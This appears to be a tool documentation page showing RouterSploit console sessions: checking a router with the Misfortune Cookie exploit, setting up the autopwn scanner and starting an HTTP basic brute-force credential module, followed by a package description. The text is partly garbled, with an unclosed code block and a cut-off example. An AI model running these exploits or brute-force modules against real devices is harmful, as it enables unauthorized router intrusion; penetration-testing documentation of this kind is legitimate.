### RouterSploit Usage Examples <a href="#routersploit-usage-examples" id="routersploit-usage-examples"></a>

RouterSploit has a number of exploits for different router models and they have the ability to check whether the remote target is vulnerable before sending off an exploit:

```
rsf > use exploits/multi/misfortune_cookie
rsf (Misfortune Cookie) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target address e.g. http://192.168.1.1


rsf (Misfortune Cookie) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}
rsf (Misfortune Cookie) > check
[-] Target is not vulnerable
rsf (Misfortune Cookie) >
```

If stealth is not a requirement, you can attempt to use the **autopwn** scanner module to see if any vulnerabilities can be found:

```
rsf > use scanners/autopwn
rsf (AutoPwn) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target IP address e.g. 192.168.1.1


rsf (AutoPwn) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}

If all else fails, RouterSploit has a number of **creds** modules that can brute force various services, including HTTP, SSH, and Telnet:

```
rsf > use creds/http_basic_bruteforce
rsf (HTTP Basic Bruteforce) > show options

Target options:

### Packages and Binaries:

#### routersploit <a href="#routersploit" id="routersploit"></a>

This package contains an open-source exploitation framework dedicated to embedded devices. It consists of various modules that aids penetration testing operations:

* exploits - modules that take advantage of identified vulnerabilities.
* creds - modules designed to test credentials against network services.
* scanners - modules that check if target is vulnerable to any exploit.
* payloads - modules that are responsible for generating payloads for various architectures and injection points.
* generic - modules that perform generic attacks.

**Installed size:** `2.14 MB`\
